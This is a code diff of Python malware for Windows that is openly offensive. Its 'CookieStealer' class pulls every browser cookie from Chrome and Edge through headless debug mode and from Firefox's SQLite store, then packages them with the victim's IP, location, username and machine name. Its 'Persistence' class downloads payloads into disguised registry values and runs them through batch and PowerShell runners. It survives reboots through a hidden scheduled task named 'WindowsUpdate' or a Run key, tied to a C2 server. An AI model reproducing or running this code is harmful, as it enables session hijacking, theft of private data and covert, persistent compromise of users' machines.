@@ -124,148 +124,141 @@ class CookieStealer:
         self.FIREFOX_PROFILE_DIR = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
         self.FIREFOX_COOKIE_FILE = os.path.join(os.getenv('TEMP'), 'firefox_cookies.json')
 
-        self.logger.debug("CookieStealer initialized with configurations:")
-        self.logger.debug(f"Chrome Path: {{self.CHROME_PATH}}")
-        self.logger.debug(f"Chrome User Data Dir: {{self.CHROME_USER_DATA_DIR}}")
-        self.logger.debug(f"Edge Path: {{self.EDGE_PATH}}")
-        self.logger.debug(f"Edge User Data Dir: {{self.EDGE_USER_DATA_DIR}}")
-        self.logger.debug(f"Firefox Profile Dir: {{self.FIREFOX_PROFILE_DIR}}")
-
     def steal_cookies(self):
         """Main method to steal cookies from all browsers"""
-        self.logger.info("Starting cookie stealing process")
         results = []
         
-        try:
-            # Chrome
-            self.logger.debug("Attempting to steal Chrome cookies")
-            chrome_data = self._process_browser_cookies(
-                'chrome',
-                self.CHROME_PATH,
-                self.chrome_debug_port,
-                self.CHROME_USER_DATA_DIR
-            )
-            if chrome_data:
-                results.append(chrome_data)
-                self.logger.info("Successfully stole Chrome cookies")
-            else:
-                self.logger.warning("Failed to steal Chrome cookies")
-            
-            # Edge
-            self.logger.debug("Attempting to steal Edge cookies")
-            edge_data = self._process_browser_cookies(
-                'edge',
-                self.EDGE_PATH,
-                self.edge_debug_port,
-                self.EDGE_USER_DATA_DIR
-            )
-            if edge_data:
-                results.append(edge_data)
-                self.logger.info("Successfully stole Edge cookies")
-            else:
-                self.logger.warning("Failed to steal Edge cookies")
-            
-            # Firefox
-            self.logger.debug("Attempting to steal Firefox cookies")
-            firefox_data = self._process_firefox_cookies()
-            if firefox_data:
-                results.append(firefox_data)
-                self.logger.info("Successfully stole Firefox cookies")
-            else:
-                self.logger.warning("Failed to steal Firefox cookies")
-            
-            self.logger.info(f"Cookie stealing completed. Retrieved from {{len(results)}} browsers")
-            return results
-            
-        except Exception as e:
-            self.logger.error(f"Critical error in steal_cookies: {{str(e)}}", exc_info=True)
-            return results
+        # Chrome
+        chrome_data = self._process_browser_cookies(
+            'chrome',
+            self.CHROME_PATH,
+            self.chrome_debug_port,
+            self.CHROME_USER_DATA_DIR
+        )
+        if chrome_data:
+            results.append(chrome_data)
+        
+        # Edge
+        edge_data = self._process_browser_cookies(
+            'edge',
+            self.EDGE_PATH,
+            self.edge_debug_port,
+            self.EDGE_USER_DATA_DIR
+        )
+        if edge_data:
+            results.append(edge_data)
+        
+        # Firefox
+        firefox_data = self._process_firefox_cookies()
+        if firefox_data:
+            results.append(firefox_data)
+        
+        return results
 
     def _process_browser_cookies(self, browser_name, browser_path, port, user_data_dir):
         """Process Chrome/Edge cookies"""
-        self.logger.debug(f"Starting {{browser_name}} cookie processing")
         try:
-            # Verify browser executable exists
-            if not os.path.exists(browser_path):
-                self.logger.error(f"{{browser_name}} not found at: {{browser_path}}")
-                return None
-
+            self._log('info', f"Processing {{browser_name}} cookies")
+            
             # Start browser in debug mode
-            self.logger.debug(f"Starting {{browser_name}} in debug mode on port {{port}}")
             proc = self._start_browser_debug(browser_path, port, user_data_dir)
             if not proc:
-                self.logger.error(f"Failed to start {{browser_name}} debug session")
                 return None
 
             # Wait for browser to start
-            self.logger.debug(f"Waiting for {{browser_name}} to initialize")
             time.sleep(5)
             
             # Get cookies via debug protocol
-            self.logger.debug(f"Attempting to retrieve {{browser_name}} cookies via debug protocol")
             cookies = self._get_cookies_via_debug(port)
             
-            if not cookies:
-                self.logger.warning(f"No cookies retrieved from {{browser_name}}")
-                return None
-
             # Clean up browser process
-            self.logger.debug(f"Terminating {{browser_name}} process")
             proc.terminate()
             proc.wait()
 
+            if not cookies:
+                return None
+
             # Transform cookies to standard format
-            self.logger.debug(f"Transforming {{browser_name}} cookies to standard format")
             transformed = self._transform_cookies(cookies)
             
             # Package cookies for transmission
-            self.logger.debug(f"Packaging {{browser_name}} cookies for transmission")
             return self._package_cookies(transformed, browser_name)
 
         except Exception as e:
-            self.logger.error(f"{{browser_name}} cookie processing failed: {{str(e)}}", exc_info=True)
+            self._log('error', f"{{browser_name}} cookie processing failed: {{str(e)}}")
             return None
 
     def _process_firefox_cookies(self):
         """Process Firefox cookies"""
-        self.logger.debug("Starting Firefox cookie processing")
         try:
+            self._log('info', "Processing Firefox cookies")
+            
             # Find Firefox profile
-            self.logger.debug("Searching for Firefox profile")
             profile_dir = self._find_firefox_profile()
             if not profile_dir:
-                self.logger.error("No Firefox profile found")
                 return None
 
-            self.logger.debug(f"Found Firefox profile at: {{profile_dir}}")
-
             # Extract cookies from SQLite database
-            self.logger.debug("Extracting cookies from Firefox SQLite database")
             cookies = self._extract_firefox_cookies(profile_dir)
             if not cookies:
-                self.logger.warning("No cookies found in Firefox database")
                 return None
 
             # Transform to standard format
-            self.logger.debug("Transforming Firefox cookies to standard format")
             transformed = self._transform_cookies(cookies)
             
             # Package for transmission
-            self.logger.debug("Packaging Firefox cookies for transmission")
             return self._package_cookies(transformed, 'firefox')
 
         except Exception as e:
-            self.logger.error(f"Firefox cookie processing failed: {{str(e)}}", exc_info=True)
+            self._log('error', f"Firefox cookie processing failed: {{str(e)}}")
             return None
 
-    def _start_browser_debug(self, browser_path, port, user_data_dir):
-        """Start browser in debug mode with detailed logging"""
-        self.logger.debug(f"Attempting to start browser: {{browser_path}}")
-        try:
-            # Kill existing browser processes
-            self.logger.debug(f"Killing existing {{os.path.basename(browser_path)}} processes")
-            self._kill_browser(os.path.basename(browser_path))
+    def _transform_cookies(self, cookies):
+        """Transform cookies into standard format with corrected sameSite values"""
+        transformed = []
+        for cookie in cookies:
+            if len(cookie) == 8:  # Firefox cookies
+                name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
+            else:  # Chrome/Edge cookies
+                name = cookie['name']
+                value = cookie['value']
+                domain = cookie['domain']
+                path = cookie['path']
+                expiry = cookie.get('expires', 0)
+                is_secure = cookie.get('secure', False)
+                is_http_only = cookie.get('httpOnly', False)
+                same_site = cookie.get('sameSite', 'unspecified')
             
+            # Fix sameSite values to match allowed options
+            if same_site.lower() == 'none':
+                same_site = 'no_restriction'
+            elif same_site.lower() == 'lax':
+                same_site = 'lax'
+            elif same_site.lower() == 'strict':
+                same_site = 'strict'
+            else:
+                same_site = 'unspecified'  # default if not matching any known value
+            
+            transformed_cookie = {{
+                "domain": domain,
+                "expirationDate": expiry,
+                "hostOnly": not domain.startswith('.'),
+                "httpOnly": bool(is_http_only),
+                "name": name,
+                "path": path,
+                "sameSite": same_site,
+                "secure": bool(is_secure),
+                "session": expiry == 0,
+                "storeId": "0",
+                "value": value
+            }}
+            transformed.append(transformed_cookie)
+        return transformed
+
+    def _start_browser_debug(self, browser_path, port, user_data_dir):
+        """Start browser in debug mode"""
+        try:
+            self._kill_browser(os.path.basename(browser_path))
             command = [
                 browser_path,
                 f'--remote-debugging-port={{port}}',
@@ -273,123 +266,192 @@ class CookieStealer:
                 '--headless',
                 f'--user-data-dir={{user_data_dir}}'
             ]
-            self.logger.debug(f"Browser command: {{' '.join(command)}}")
-            
-            proc = subprocess.Popen(command, 
-                                  stdout=subprocess.PIPE,
-                                  stderr=subprocess.PIPE)
-            
-            # Log any startup errors
-            def log_stream(stream, stream_type):
-                for line in iter(stream.readline, b''):
-                    self.logger.debug(f"Browser {{stream_type}}: {{line.decode().strip()}}")
-            
-            threading.Thread(target=log_stream, args=(proc.stdout, 'stdout')).start()
-            threading.Thread(target=log_stream, args=(proc.stderr, 'stderr')).start()
-            
-            return proc
-            
+            return subprocess.Popen(command, 
+                                  stdout=subprocess.DEVNULL,
+                                  stderr=subprocess.DEVNULL)
         except Exception as e:
-            self.logger.error(f"Failed to start browser: {{str(e)}}", exc_info=True)
+            self._log('error', f"Failed to start browser: {{str(e)}}")
             return None
 
+    def _kill_browser(self, process_name):
+        """Kill browser process if running"""
+        try:
+            subprocess.run(f'taskkill /F /IM {{process_name}}', shell=True,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
     def _get_cookies_via_debug(self, port):
-        """Get cookies using Chrome DevTools Protocol with detailed logging"""
-        self.logger.debug(f"Attempting to connect to debug port {{port}}")
+        """Get cookies using Chrome DevTools Protocol"""
         try:
             debug_url = f'http://localhost:{{port}}/json'
-            self.logger.debug(f"Fetching debug targets from: {{debug_url}}")
-            
             response = requests.get(debug_url, timeout=self.timeout)
             response.raise_for_status()
             
             data = response.json()
             if not data:
-                self.logger.warning("No debug targets found")
                 return []
                 
             ws_url = data[0]['webSocketDebuggerUrl']
-            self.logger.debug(f"Connecting to WebSocket: {{ws_url}}")
-            
             ws = websocket.create_connection(ws_url, timeout=self.timeout)
             
-            self.logger.debug("Sending cookie request via WebSocket")
             ws.send(json.dumps({{
                 'id': 1,
                 'method': 'Network.getAllCookies'
             }}))
             
             response = json.loads(ws.recv())
-            self.logger.debug(f"Received {{len(response['result']['cookies'])}} cookies")
             return response['result']['cookies']
-            
-        except requests.exceptions.RequestException as e:
-            self.logger.error(f"HTTP request failed: {{str(e)}}")
-            return []
-        except websocket.WebSocketException as e:
-            self.logger.error(f"WebSocket error: {{str(e)}}")
-            return []
         except Exception as e:
-            self.logger.error(f"Unexpected debug protocol error: {{str(e)}}", exc_info=True)
+            self._log('error', f"Debug protocol error: {{str(e)}}")
             return []
         finally:
             if 'ws' in locals():
-                try:
-                    ws.close()
-                except:
-                    pass
+                ws.close()
+
+    def _find_firefox_profile(self):
+        """Find Firefox profile directory"""
+        try:
+            for profile in os.listdir(self.FIREFOX_PROFILE_DIR):
+                if profile.endswith('.default-release'):
+                    return os.path.join(self.FIREFOX_PROFILE_DIR, profile)
+            return None
+        except Exception as e:
+            self._log('error', f"Failed to find Firefox profile: {{str(e)}}")
+            return None
 
     def _extract_firefox_cookies(self, profile_dir):
-        """Extract cookies from Firefox SQLite database with detailed logging"""
-        self.logger.debug(f"Extracting cookies from Firefox profile: {{profile_dir}}")
+        """Extract cookies from Firefox SQLite database"""
         try:
             cookies_db = os.path.join(profile_dir, 'cookies.sqlite')
             if not os.path.exists(cookies_db):
-                self.logger.error(f"Firefox cookies database not found at: {{cookies_db}}")
                 return []
                 
-            self.logger.debug(f"Opening SQLite database: {{cookies_db}}")
             conn = sqlite3.connect(cookies_db)
             cursor = conn.cursor()
             
-            cursor.execute("PRAGMA table_info(moz_cookies)")
-            columns = cursor.fetchall()
-            self.logger.debug(f"Firefox cookie table columns: {{columns}}")
-            
-            cursor.execute("SELECT COUNT(*) FROM moz_cookies")
-            count = cursor.fetchone()[0]
-            self.logger.debug(f"Found {{count}} cookies in database")
-            
+            # Modified query to ensure all fields are properly handled
             cursor.execute("""
                 SELECT 
-                    name, value, host, path, expiry, 
-                    isSecure, isHttpOnly, sameSite 
+                    CAST(name AS TEXT) as name,
+                    CAST(value AS TEXT) as value,
+                    CAST(host AS TEXT) as host,
+                    CAST(path AS TEXT) as path,
+                    CAST(expiry AS INTEGER) as expiry,
+                    CAST(isSecure AS INTEGER) as isSecure,
+                    CAST(isHttpOnly AS INTEGER) as isHttpOnly,
+                    CAST(sameSite AS INTEGER) as sameSite 
                 FROM moz_cookies
             """)
             
             cookies = []
             for row in cursor.fetchall():
                 try:
+                    # Ensure all values are properly converted
                     cookies.append((
-                        str(row[0]), str(row[1]), str(row[2]), str(row[3]),
-                        int(row[4]) if row[4] else 0,
-                        bool(row[5]), bool(row[6]),
-                        str(row[7]) if row[7] else 'none'
+                        str(row[0]),  # name
+                        str(row[1]),  # value
+                        str(row[2]),  # host
+                        str(row[3]),  # path
+                        int(row[4]) if row[4] else 0,  # expiry
+                        bool(row[5]),  # isSecure
+                        bool(row[6]),  # isHttpOnly
+                        str(row[7]) if row[7] else 'none'  # sameSite
                     ))
                 except Exception as e:
-                    self.logger.warning(f"Error processing cookie row: {{str(e)}}")
+                    self._log('error', f"Error processing Firefox cookie: {{str(e)}}")
                     continue
             
             conn.close()
-            self.logger.debug(f"Successfully extracted {{len(cookies)}} cookies")
             return cookies
-            
-        except sqlite3.Error as e:
-            self.logger.error(f"SQLite error: {{str(e)}}")
-            return []
         except Exception as e:
-            self.logger.error(f"Unexpected Firefox cookie extraction error: {{str(e)}}", exc_info=True)
+            self._log('error', f"Failed to extract Firefox cookies: {{str(e)}}")
             return []
+
+    def _get_system_info(self):
+        """Get system information."""
+        try:
+            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
+            return {{
+                'ip_address': ip_info.get('ip', 'Unknown'),
+                'location': f"{{ip_info.get('city', 'Unknown')}}, {{ip_info.get('country', 'Unknown')}}",
+                'username': os.getenv('USERNAME'),
+                'computer_name': os.getenv('COMPUTERNAME'),
+                'windows_version': platform.version(),
+                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
+            }}
+        except Exception as e:
+            return {{
+                'ip_address': 'Unknown',
+                'location': 'Unknown',
+                'username': 'Unknown',
+                'computer_name': 'Unknown',
+                'windows_version': 'Unknown',
+                'user_agent': 'Unknown'
+            }}
+
+    def _extract_unique_domains(self, cookies):
+        """Extract unique domains from cookies."""
+        unique_domains = set()
+        for cookie in cookies:
+            domain = cookie.get('domain', '')
+            if domain:
+                unique_domains.add(domain)
+        return list(unique_domains)
+
+    def _package_cookies(self, cookies, browser_name):
+        """Package cookies into base64 encoded JSON with system info"""
+        try:
+            if not cookies:
+                return None
+                
+            # Extract unique domains
+            unique_domains = self._extract_unique_domains(cookies)
+            self.unique_domains.update(unique_domains)
+            
+            # Get system info
+            system_info = self._get_system_info()
+            
+            # Create temporary file
+            temp_dir = os.path.join(os.getenv('TEMP'), 'cookie_stealer')
+            os.makedirs(temp_dir, exist_ok=True)
+            
+            temp_file = os.path.join(temp_dir, f'{{browser_name}}_cookies.json')
+            with open(temp_file, 'w') as f:
+                json.dump(cookies, f, indent=4)
+            
+            # Read file content
+            with open(temp_file, 'rb') as f:
+                cookie_data = f.read()
+            
+            # Clean up
+            os.remove(temp_file)
+            
+            return {{
+                'browser': browser_name,
+                'zip_content': base64.b64encode(cookie_data).decode('utf-8'),
+                'system_info': {{
+                    **system_info,
+                    'unique_domains': unique_domains,
+                    'all_domains': list(self.unique_domains)
+                }}
+            }}
+        except Exception as e:
+            self._log('error', f"Failed to package {{browser_name}} cookies: {{str(e)}}")
+            return None
+
+    def _create_default_logger(self):
+        logger = logging.getLogger('CookieStealer')
+        if not logger.handlers:
+            handler = logging.StreamHandler()
+            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+            logger.addHandler(handler)
+            logger.setLevel(logging.INFO)
+        return logger
+
+    def _log(self, level, message):
+        if self.logger:
+            getattr(self.logger, level)(message)
 
 # ======================
 # System Functions
@@ -524,190 +586,280 @@ class SystemUtils:
 class Persistence:
     @staticmethod
     def _download_to_registry(url, value_name, c2_server):
-        """Download content and store in registry as binary blob"""
+        logger = logging.getLogger('agent.persistence.download')
         try:
+            logger.info(f"Attempting to download content from {{url}}")
             response = requests.get(url, verify=False)
             response.raise_for_status()
+            logger.debug(f"Successfully downloaded {{len(response.content)}} bytes")
             
-            is_admin = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) is not None
+            # More reliable admin check
+            is_admin = False
+            try:
+                import ctypes
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                logger.debug(f"Admin privileges: {{is_admin}}")
+            except Exception as e:
+                logger.debug(f"Admin check failed: {{str(e)}}")
+                # Fallback method
+                try:
+                    test_key = winreg.OpenKey(
+                        winreg.HKEY_LOCAL_MACHINE,
+                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
+                        0,
+                        winreg.KEY_WRITE | winreg.KEY_READ
+                    )
+                    winreg.CloseKey(test_key)
+                    is_admin = True
+                except WindowsError:
+                    is_admin = False
+            
             reg_path = (r"SOFTWARE\Microsoft\Windows\CurrentVersion\VersionInfo" if is_admin 
-                       else r"Software\Microsoft\Accessibility\Setup")
+                    else r"Software\Microsoft\Accessibility\Setup")
             root_key = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER
             
-            key = winreg.CreateKey(root_key, reg_path)
-            winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
-            winreg.CloseKey(key)
-            return True
+            logger.info(f"Storing {{value_name}} in registry at {{root_key}}\\{{reg_path}}")
+            
+            try:
+                # Ensure we have write permissions by using correct access flags
+                access = winreg.KEY_WRITE | winreg.KEY_READ
+                key = winreg.CreateKeyEx(root_key, reg_path, 0, access)
+                winreg.SetValueEx(key, value_name, 0, winreg.REG_BINARY, response.content)
+                winreg.CloseKey(key)
+                logger.info(f"Successfully stored {{value_name}} in registry")
+                return True
+            except Exception as e:
+                logger.error(f"Failed to write to registry: {{str(e)}}")
+                return False
+                
+        except requests.RequestException as e:
+            logger.error(f"Download failed: {{str(e)}}")
+            return False
         except Exception as e:
-            logging.error(f"Failed to store {{value_name}} in registry: {{str(e)}}")
+            logger.error(f"Unexpected error in _download_to_registry: {{str(e)}}", exc_info=True)
             return False
 
     @staticmethod
-    def _generate_python_runner():
-        """Generate Python script that will read from registry and execute"""
-        # Using line breaks and string concatenation to avoid triple-quote issues
-        python_code = (
-            "import os\nimport winreg\nimport tempfile\n"
-            "import zipfile\nimport sys\nimport subprocess\n\n"
-            "def get_registry_data(reg_path, value_name, is_admin):\n"
-            "    try:\n"
-            "        root = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER\n"
-            "        with winreg.OpenKey(root, reg_path, 0, winreg.KEY_READ) as key:\n"
-            "            value, _ = winreg.QueryValueEx(key, value_name)\n"
-            "            return value\n"
-            "    except Exception:\n"
-            "        return None\n\n"
-            "def main():\n"
-            "    is_admin = False\n"
-            "    try:\n"
-            "        winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n"
-            "        is_admin = True\n"
-            "    except:\n"
-            "        pass\n\n"
-            "    reg_path = (r\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\VersionInfo\" if is_admin\n"
-            "               else r\"Software\\\\Microsoft\\\\Accessibility\\\\Setup\")\n\n"
-            "    engine_data = get_registry_data(reg_path, \"engine\", is_admin)\n"
-            "    if engine_data:\n"
-            "        python_dir = os.path.join(os.environ['PUBLIC'], 'documents')\n"
-            "        os.makedirs(python_dir, exist_ok=True)\n"
-            "        zip_path = os.path.join(python_dir, 'p.zip')\n"
-            "        with open(zip_path, 'wb') as f:\n"
-            "            f.write(engine_data)\n"
-            "        with zipfile.ZipFile(zip_path, 'r') as zip_ref:\n"
-            "            zip_ref.extractall(python_dir)\n"
-            "        try:\n"
-            "            os.remove(zip_path)\n"
-            "        except:\n"
-            "            pass\n\n"
-            "    lube_data = get_registry_data(reg_path, \"lube\", is_admin)\n"
-            "    if lube_data:\n"
-            "        script = lube_data.decode('utf-8')\n"
-            "        python_exe = os.path.join(python_dir, 'python.exe')\n"
-            "        if os.path.exists(python_exe):\n"
-            "            subprocess.Popen(\n"
-            "                [python_exe, \"-c\", script],\n"
-            "                creationflags=subprocess.CREATE_NO_WINDOW,\n"
-            "                stdout=subprocess.PIPE,\n"
-            "                stderr=subprocess.PIPE,\n"
-            "                stdin=subprocess.PIPE\n"
-            "            )\n"
-            "        else:\n"
-            "            subprocess.Popen(\n"
-            "                [\"python\", \"-c\", script],\n"
-            "                creationflags=subprocess.CREATE_NO_WINDOW,\n"
-            "                stdout=subprocess.PIPE,\n"
-            "                stderr=subprocess.PIPE,\n"
-            "                stdin=subprocess.PIPE\n"
-            "            )\n\n"
-            "if __name__ == \"__main__\":\n"
-            "    main()"
-        )
-        return base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
+    def _generate_batch_runner():
+        logger = logging.getLogger('agent.persistence.generator')
+        try:
+            batch_lines = [
+                '@echo off',
+                'setlocal enabledelayedexpansion',
+                '',
+                ':: Configure paths',
+                'set "extract_root=%public%"',
+                'set "python_dir=%extract_root%\\documents"',
+                'set "python_exe=%python_dir%\\python.exe"',
+                'set "py_script=%python_dir%\\run_lube.py"',
+                '',
+                'if exist "%python_exe%" (',
+                '    goto HavePython',
+                ')',
+                '',
+                'set "ps_command=$ErrorActionPreference = \'Stop\';"',
+                'set "ps_command=%ps_command% $regPaths = @(\'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\',\'HKCU:\\Software\\Microsoft\\Accessibility\\Setup\');"',
+                'set "ps_command=%ps_command% foreach ($path in $regPaths) {{"',
+                'set "ps_command=%ps_command%     if (Test-Path $path) {{"',
+                'set "ps_command=%ps_command%         $val = Get-ItemProperty -Path $path -Name \'engine\' -ErrorAction SilentlyContinue;"',
+                'set "ps_command=%ps_command%         if ($val -and $val.engine) {{"',
+                'set "ps_command=%ps_command%             $zipPath = Join-Path $env:TEMP \'python_engine.zip\';"',
+                'set "ps_command=%ps_command%             [IO.File]::WriteAllBytes($zipPath, $val.engine);"',
+                'set "ps_command=%ps_command%             $extractTo = \'%extract_root%\';"',
+                'set "ps_command=%ps_command%             if (-not (Test-Path $extractTo)) {{ New-Item -Path $extractTo -ItemType Directory -Force | Out-Null }};"',
+                'set "ps_command=%ps_command%             Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force;"',
+                'set "ps_command=%ps_command%             Remove-Item $zipPath -Force;"',
+                'set "ps_command=%ps_command%             $pythonPath = Join-Path $extractTo \'documents\\python.exe\';"',
+                'set "ps_command=%ps_command%             if (Test-Path $pythonPath) {{ exit 0 }}"',
+                'set "ps_command=%ps_command%         }}"',
+                'set "ps_command=%ps_command%     }}"',
+                'set "ps_command=%ps_command% }};"',
+                'set "ps_command=%ps_command% throw \'Failed to extract Python from registry\'"',
+                '',
+                'powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_command%"',
+                'if errorlevel 1 (',
+                '    echo ERROR: Failed to extract Python from registry',
+                '    pause',
+                '    exit /b 1',
+                ')',
+                '',
+                ':HavePython',
+                '',
+                '(',
+                'echo import winreg',
+                'echo import sys',
+                'echo.',
+                'echo try:',
+                'echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
+                'echo     value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
+                'echo     script = value.decode(\'utf-8\'^) if regtype == winreg.REG_BINARY else value',
+                'echo     exec(script^)',
+                'echo except Exception as e:',
+                'echo     print(f\'Error: {{e}}\'^)',
+                'echo     sys.exit(1^)',
+                ') > "%py_script%" 2>nul',
+                '',
+                '"%python_exe%" "%py_script%"',
+                'if errorlevel 1 (',
+                '    echo ERROR: Python script execution failed',
+                '    pause',
+                '    exit /b 1',
+                ')',
+                '',
+                'endlocal'
+            ]
+            
+            batch_code = '\r\n'.join(batch_lines)
+            return base64.b64encode(batch_code.encode('utf-8')).decode('utf-8')
+        except Exception as e:
+            logger.error(f"Failed to generate batch runner: {{str(e)}}", exc_info=True)
+            raise
 
     @staticmethod
     def _create_scheduled_task():
-        """Create scheduled task to execute the Python runner"""
-        task_name = f"WindowsUpdate_{{random.randint(1000,9999)}}"
-        encoded_python = Persistence._generate_python_runner()
-        
-        # VBS script with proper string escaping
-        vbs_lines = [
-            'Set objShell = CreateObject("WScript.Shell")',
-            'pythonDir = objShell.ExpandEnvironmentStrings("%PUBLIC%") & "\\documents"',
-            'pythonExe = pythonDir & "\\python.exe"',
-            '',
-            'embeddedPythonExists = False',
-            'Set fso = CreateObject("Scripting.FileSystemObject")',
-            'If fso.FileExists(pythonExe) Then',
-            '    embeddedPythonExists = True',
-            'End If',
-            '',
-            'encoded = "' + encoded_python + '"',
-            'decoded = ""',
-            'For i = 1 To Len(encoded) Step 4',
-            '    chunk = Mid(encoded, i, 4)',
-            '    decoded = decoded & ChrW(CLng("&H" & Mid(chunk, 1, 2))) & ChrW(CLng("&H" & Mid(chunk, 3, 2)))',
-            'Next',
-            '',
-            'Set tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\\runner.py", True)',
-            'tempFile.Write decoded',
-            'tempFile.Close',
-            '',
-            'If embeddedPythonExists Then',
-            '    objShell.Run """" & pythonExe & """ """ & fso.GetSpecialFolder(2) & "\\runner.py""", 0, False',
-            'Else',
-            '    objShell.Run "python """ & fso.GetSpecialFolder(2) & "\\runner.py""", 0, False',
-            'End If'
-        ]
-        
-        vbs_path = os.path.join(os.getenv('PUBLIC'), f'run_{{random.randint(1000,9999)}}.vbs')
-        with open(vbs_path, 'w') as f:
-            f.write("\n".join(vbs_lines))
-        
-        # Task XML with proper escaping
-        task_xml_lines = [
-            '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
-            '    <Triggers>',
-            '        <LogonTrigger>',
-            '            <Enabled>true</Enabled>',
-            '        </LogonTrigger>',
-            '    </Triggers>',
-            '    <Principals>',
-            '        <Principal id="Author">',
-            '            <RunLevel>HighestAvailable</RunLevel>',
-            '        </Principal>',
-            '    </Principals>',
-            '    <Settings>',
-            '        <Hidden>true</Hidden>',
-            '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
-            '    </Settings>',
-            '    <Actions Context="Author">',
-            '        <Exec>',
-            '            <Command>wscript</Command>',
-            f'            <Arguments>"{{vbs_path}}"</Arguments>',
-            '        </Exec>',
-            '    </Actions>',
-            '</Task>'
-        ]
-        
-        xml_path = os.path.join(os.getenv('TEMP'), f'task_{{random.randint(1000,9999)}}.xml')
-        with open(xml_path, 'w') as f:
-            f.write("\n".join(task_xml_lines))
-        
+        logger = logging.getLogger('agent.persistence.task')
         try:
-            subprocess.run(
+            # Check admin status
+            is_admin = False
+            try:
+                import ctypes
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                logger.debug(f"Admin privileges: {{is_admin}}")
+            except Exception as e:
+                logger.debug(f"Admin check failed: {{str(e)}}")
+                try:
+                    test_key = winreg.OpenKey(
+                        winreg.HKEY_LOCAL_MACHINE,
+                        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
+                        0,
+                        winreg.KEY_WRITE | winreg.KEY_READ
+                    )
+                    winreg.CloseKey(test_key)
+                    is_admin = True
+                except WindowsError:
+                    is_admin = False
+
+            task_name = "WindowsUpdate"
+            logger.debug(f"Generated task name: {{task_name}}")
+            
+            encoded_batch = Persistence._generate_batch_runner()
+            logger.debug("Successfully generated encoded batch runner")
+            
+            # Create batch file in Public directory
+            batch_path = os.path.join(os.getenv('PUBLIC'), "documents", "runner.cmd")
+            logger.debug(f"Writing batch runner to {{batch_path}}")
+            
+            decoded_batch = base64.b64decode(encoded_batch).decode('utf-8')
+            with open(batch_path, 'w') as f:
+                f.write(decoded_batch)
+            
+            logger.info(f"Batch runner created at {{batch_path}}")
+
+            # Different approach for non-admin users
+            if not is_admin:
+                logger.info("Running as non-admin, using alternate persistence method")
+                
+                # Create registry run key instead of scheduled task
+                try:
+                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, f'conhost --headless cmd /c "{{batch_path}}"')
+                    winreg.CloseKey(key)
+                    logger.info(f"Created Run registry key for current user")
+                    return task_name
+                except Exception as e:
+                    logger.error(f"Failed to create Run registry key: {{str(e)}}")
+                    return None
+
+            # Admin task creation (original code)
+            task_xml_lines = [
+                '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">',
+                '    <Triggers>',
+                '        <LogonTrigger>',
+                '            <Enabled>true</Enabled>',
+                '        </LogonTrigger>',
+                '    </Triggers>',
+                '    <Principals>',
+                '        <Principal id="Author">',
+                '            <RunLevel>HighestAvailable</RunLevel>',
+                '        </Principal>',
+                '    </Principals>',
+                '    <Settings>',
+                '        <Hidden>true</Hidden>',
+                '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
+                '    </Settings>',
+                '    <Actions Context="Author">',
+                '        <Exec>',
+                '            <Command>conhost</Command>',
+                f'            <Arguments>--headless cmd /c "{{batch_path}}"</Arguments>',
+                '        </Exec>',
+                '    </Actions>',
+                '</Task>'
+            ]
+            
+            xml_path = os.path.join(os.getenv('TEMP'), f'task_{{random.randint(1000,9999)}}.xml')
+            logger.debug(f"Writing task XML to {{xml_path}}")
+            
+            with open(xml_path, 'w') as f:
+                f.write("\n".join(task_xml_lines))
+            
+            logger.info(f"Creating scheduled task '{{task_name}}'")
+            result = subprocess.run(
                 ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
                 creationflags=subprocess.CREATE_NO_WINDOW,
-                check=True,
-                capture_output=True
+                capture_output=True,
+                text=True
             )
+            
+            if result.returncode == 0:
+                logger.info(f"Successfully created task '{{task_name}}'")
+            else:
+                logger.error(f"Failed to create task. STDOUT: {{result.stdout}} STDERR: {{result.stderr}}")
+                return None
+            
             return task_name
+        except Exception as e:
+            logger.error(f"Failed to create scheduled task: {{str(e)}}", exc_info=True)
+            return None
         finally:
             try:
-                os.remove(xml_path)
-            except:
-                pass
+                if 'xml_path' in locals() and os.path.exists(xml_path):
+                    os.remove(xml_path)
+                    logger.debug(f"Cleaned up temporary XML file: {{xml_path}}")
+            except Exception as e:
+                logger.error(f"Failed to clean up XML file: {{str(e)}}")
 
     @staticmethod
     def install(c2_server):
-        logger = logging.getLogger('Persistence')
+        logger = logging.getLogger('agent.persistence.install')
         try:
+            logger.info(f"Starting persistence installation with C2: {{c2_server}}")
+            
             if platform.system() != "Windows":
+                logger.error("Non-Windows platform detected")
